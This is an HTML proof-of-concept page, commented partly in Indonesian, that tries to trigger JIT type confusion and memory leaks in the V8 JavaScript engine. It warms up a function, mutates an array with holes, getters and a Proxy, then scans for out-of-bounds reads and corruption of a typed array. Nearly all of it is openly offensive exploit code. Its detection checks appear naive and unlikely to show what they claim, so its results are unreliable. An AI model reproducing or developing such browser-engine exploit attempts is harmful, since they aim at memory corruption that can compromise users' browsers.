<!doctype html>
<meta charset="utf-8">
<title>V8 Deterministic Leak PoC</title>

<pre id="log"></pre>
<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
  console.log(m);
};

// TARGET
function vuln(a,i){ return a[i] + 1.1; }

// WARMUP (cukup, tapi tidak berlebihan)
function warmup(){
  let arr = Array.from({length:20}, (_,i)=>i+0.5);
  for(let i=0;i<50000;i++) vuln(arr, i%20);
  return arr;
}

// MUTATION (FIXED, NO RANDOM)
function mutate(arr){
  // create holes
  delete arr[0];
  delete arr[1];
  delete arr[2];

  // shrink lalu extend
  arr.length = 5;
  arr[40] = 13.37;

  // paksa type confusion
  arr[3] = {x:1};

  // getter deterministic
  Object.defineProperty(arr,1,{
    get(){
      arr[10] = 99.99;
      return 1.1;
    }
  });

  return arr;
}

// MINIMAL ASSUMPTION BREAK
function breakAssumption(a){
  return new Proxy(a,{
    get(t,p){
      if(p === "length"){
        t[20] = 77.77; // deterministic
      }
      return Reflect.get(t,p);
    }
  });
}

// TYPED ARRAY
let buf = new ArrayBuffer(0x2000);
let f64 = new Float64Array(buf);

// INIT PATTERN (penting buat deteksi)
for(let i=0;i<f64.length;i++){
  f64[i] = 0x41414141 + i;
}

// MAIN
function run(){
  log("[*] warmup");
  let base = warmup();

  log("[*] trigger");

  let arr = [...base];
  arr = mutate(arr);
  arr = breakAssumption(arr);

  // trigger JIT assumption
  let r1 = vuln(arr,1);
  let r2 = vuln(arr,10);
  let r3 = vuln(arr,40);

  log("r1=" + r1);
  log("r2=" + r2);
  log("r3=" + r3);

  // CHECK OOB (FIXED RANGE)
  for(let i=0;i<20;i++){
    let idx = arr.length + i;
    let v = arr[idx];
    if(v !== undefined){
      log("[OOB] idx="+idx+" val="+v);
    }
  }

  // CHECK TYPED ARRAY CORRUPTION
  for(let i=0;i<50;i++){
    let v = f64[i];

    // kalau berubah dari pattern awal → suspicious
    if(v !== 0x41414141 + i){
      log("[CORRUPTION] idx="+i+" val="+v);
    }

    if(Math.abs(v) > 1e12){
      log("[PTR-LIKE] idx="+i+" val="+v);
    }
  }

  log("[*] done");
}

run();
</script>
